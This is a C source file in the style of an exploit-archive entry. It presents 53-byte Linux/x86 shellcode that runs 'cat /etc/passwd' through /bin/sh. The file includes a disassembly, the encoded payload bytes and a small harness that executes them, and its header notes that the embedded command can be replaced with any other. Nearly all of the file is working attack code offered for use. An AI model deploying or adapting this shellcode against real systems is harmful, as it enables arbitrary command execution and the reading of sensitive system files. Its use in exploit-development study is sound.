/* 
*  Title:    Execve (cat /etc/passwd) Shellcode (MSF Optimization) - 53 bytes
*  Platform: Linux/x86
*  Date:     13 September 2018
*  Author:   Ray Doyle (@doylersec)
*  Website:  http://www.doyler.net
*  
*  Description: This shellcode will execute 'cat /etc/passwd'. This command cand be modified in the 'command' section of the below shellcode.
*
*  For more information on this shellcode, please see the following blog post:
*  https://www.doyler.net/security-not-included/metasploit-exec-analysis
*/

/****************************************************
Disassembly of section .text:

08048060 <_start>:
 8048060:	6a 0b                	push   0xb
 8048062:	58                   	pop    eax
 8048063:	99                   	cdq    
 8048064:	52                   	push   edx
 8048065:	66 68 2d 63          	pushw  0x632d
 8048069:	89 e7                	mov    edi,esp
 804806b:	52                   	push   edx
 804806c:	68 2f 2f 73 68       	push   0x68732f2f
 8048071:	68 2f 62 69 6e       	push   0x6e69622f
 8048076:	89 e3                	mov    ebx,esp
 8048078:	52                   	push   edx

08048079 <pre_exec>:
 8048079:	eb 06                	jmp    8048081 <call_exec>

0804807b <exec>:
 804807b:	57                   	push   edi
 804807c:	53                   	push   ebx
 804807d:	89 e1                	mov    ecx,esp
 804807f:	cd 80                	int    0x80

08048081 <call_exec>:
 8048081:	e8 f5 ff ff ff       	call   804807b <exec>

08048086 <command>:
 8048086:	63 61 74             	arpl   WORD PTR [ecx+0x74],sp
 8048089:	20 2f                	and    BYTE PTR [edi],ch
 804808b:	65                   	gs
 804808c:	74 63                	je     80480f1 <command+0x6b>
 804808e:	2f                   	das    
 804808f:	70 61                	jo     80480f2 <command+0x6c>
 8048091:	73 73                	jae    8048106 <command+0x80>
 8048093:	77 64                	ja     80480f9 <command+0x73>
****************************************************/

#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\xeb\x06\x57\x53\x89\xe1\xcd\x80\xe8\xf5\xff\xff\xff\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64";

main()
{
    printf("Shellcode Length: %d\n", strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}
